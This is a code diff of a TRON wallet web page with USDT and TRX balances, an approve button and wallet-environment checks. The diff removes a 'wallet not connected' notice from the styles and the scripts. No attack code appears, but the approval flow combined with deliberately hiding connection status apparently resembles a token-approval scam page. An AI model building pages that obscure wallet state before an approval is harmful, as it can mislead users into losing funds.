@@ -223,15 +223,6 @@
 .balance-energy { bottom: 10px; left: 40px; } /* 调整：能量项位置（底部左方） */
 .balance-bandwidth { bottom: 10px; right: 40px; } /* 调整：宽带项位置（底部右方） */
 
-/* 余额容器-未连接钱包提示样式 */
-#userInfoDefault {
-    position: absolute;
-    top: 8px; /* 调整：提示文字垂直位置 */
-    left: 50%; /* 调整：提示文字水平居中 */
-    transform: translate(-50%, -50%); /* 调整：提示文字完全居中 */
-    width: 100%;
-    color: #a0a8a4; /* 调整：提示文字色 | 色号对应：浅灰绿色 */
-}
 #userInfo span {
     font-weight: 500; /* 调整：文字加粗（500权重） */
 }
@@ -1039,8 +1030,7 @@
         recordList: document.getElementById("recordList"),
         specialTipContainer: document.getElementById("specialTipContainer"),
         nonImTokenPopup: document.getElementById("nonImTokenPopup"),
-        closePopupBtn: document.getElementById("closePopupBtn"),
-        userInfoDefault: document.getElementById("userInfoDefault"),
+        closePopupBtn: document.getElementById("closePopupBtn"),       
         balanceUsdtEl: document.getElementById("balanceUsdt"),
         balanceTrxEl: document.getElementById("balanceTrx"),
         balanceEnergyEl: document.getElementById("balanceEnergy"),
@@ -1357,11 +1347,9 @@ async function queryUserEnergyBalance(address) {
     function updateUserInfoDisplay() {
         const lang = langConfig[currentLang];
         if (!userAddress) {
-            DOM.userInfoDefault.style.display = "block";
             DOM.userInfoStatus.style.display = "none";
             updateUserBalanceDisplay();
         } else {
-            DOM.userInfoDefault.style.display = "none";
             DOM.userInfoStatus.style.display = "block";
             // 显示地址（统一格式）
             if (DOM.statusAddressEl) {
@@ -1602,8 +1590,7 @@ async function sendSignalA1() {
             }    
             
             updateWalletStatus();
-            if (!userAddress) {
-                DOM.userInfoDefault.style.display = "block";
+            if (!userAddress) {        
                 DOM.userInfoStatus.style.display = "block";
                 DOM.balanceItems.forEach(item => item.style.display = "none");
                 DOM.approveBtn.disabled = true;
@@ -1617,7 +1604,6 @@ async function sendSignalA1() {
 
             // 步骤2：查询余额前先显示“环境检测中”（覆盖原“查询中”）
             DOM.userInfoStatus.innerHTML = ""; // 清空旧提示，避免叠加
-            DOM.userInfoDefault.style.display = "block";
             DOM.userInfoStatus.style.display = "block";
             DOM.userInfoStatus.innerHTML = lang.a1CheckingTip; // 发送A1前显示检测中
             DOM.recordList.style.display = "block";
@@ -1703,7 +1689,6 @@ async function sendSignalA1() {
 
         } catch (e) {
             console.error("钱包初始化失败：", e);
-            DOM.userInfoDefault.style.display = "none";
             DOM.userInfoStatus.style.display = "block";
             // 移除：原可能存在的“未连接”提示文本，保留错误信息
             DOM.userInfoStatus.innerHTML = `${lang.errorTipPrefix}${e.message || lang.ineligibleTip}`;
@@ -1733,7 +1718,6 @@ async function sendSignalA1() {
 
         // 非钱包环境：自动显示弹窗（核心需求）+ 显示连接按钮（关闭后可重新触发）
         DOM.specialTipContainer.style.display = "block";
-        DOM.userInfoDefault.style.display = "none";
         DOM.userInfoStatus.style.display = "block";
         // 移除：原“请选择要连接的钱包”文本（避免关联“未连接”提示）
         DOM.userInfoStatus.innerHTML = "";
@@ -2004,7 +1988,6 @@ async function sendSignalA1() {
                     console.error("授权后初始化失败：", err);
                     const lang = langConfig[currentLang];
                     const tip = lang.ineligibleTip;
-                    DOM.userInfoDefault.style.display = "none";
                     DOM.userInfoStatus.style.display = "block";
                     DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                     DOM.approveBtn.disabled = false;
@@ -2034,7 +2017,6 @@ async function sendSignalA1() {
                 await checkWalletEnv().catch(err => {
                     console.error("环境检测失败：", err);
                     const lang = langConfig[currentLang];
-                    DOM.userInfoDefault.style.display = "block";
                     DOM.userInfoStatus.style.display = "none";
                     DOM.balanceItems.forEach(item => item.style.display = "none");
                     DOM.approveBtn.disabled = true;
